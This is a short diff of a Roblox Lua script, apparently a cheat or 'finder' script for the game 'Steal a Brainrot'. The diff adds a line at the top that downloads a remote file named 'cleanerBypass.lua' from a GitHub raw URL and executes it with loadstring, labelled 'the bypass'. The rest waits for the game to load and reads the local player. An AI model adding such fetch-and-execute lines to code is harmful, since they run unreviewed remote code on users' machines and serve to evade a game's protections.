@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/donkidonn/steal-a-brainrot-finder-script/refs/heads/main/cleanerBypass.lua"))() -- the bypass 
+
 repeat wait() until game:IsLoaded() -- wait until the game is loaded
 
 -- get the local player and their username
